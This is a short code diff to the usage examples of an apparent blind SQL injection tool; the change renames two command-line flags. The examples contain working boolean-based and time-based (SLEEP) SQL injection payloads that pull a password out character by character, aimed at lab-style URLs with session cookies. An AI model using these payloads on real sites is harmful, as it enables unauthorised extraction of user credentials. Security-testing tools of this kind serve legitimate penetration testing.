@@ -351,7 +351,7 @@ Extracted: '<extracted strings>'
 
 epi = """EXAMPLES:
 python main.py {atype} -p "0' AND BINARY SUBSTR(password, \!I, 1) \!S '\!C' #" -c '{{"PHPSESSID":"l0ishrnmb6annfe1iin11nrqr7", "security":"low"}}' -m reg --reg "User ID exists in the database\\." --get http://172.0.0.1/vulnerabilities/sqli_blind/
-\npython main.py {atype} -p 'admin\" AND BINARY SUBSTR(password, !I, 1) !S "!C" #' -b 'username=!P' -m reg --regex 'This user exists\.' --proxy-burp --header-fomrUrl --username john --password Password!23  http://testThatDontExist.come/uidFinder.php
+\npython main.py {atype} -p 'admin\" AND BINARY SUBSTR(password, !I, 1) !S "!C" #' -b 'username=!P' -m reg --regex 'This user exists\.' --proxy-burp --header-fomrUrl --user john --passwd Password!23  http://testThatDontExist.come/uidFinder.php
 \npython main.py {atype} -p "10' AND IF(BINARY SUBSTR(password, \!I, 1) \!S '\!C', SLEEP(0.7), FALSE) #" -b 'value=!P' -c '{{"SID":"etc7stehjcs7c4kqaa6p6kit03"}}' --get -m to --timeout 0.5 http://notReal.wasd/login.php
 
 TIP: for testing regex, you can use 'python file.py -s <attack type> --test --content | grep -E "regex expression"' to check for triggers.
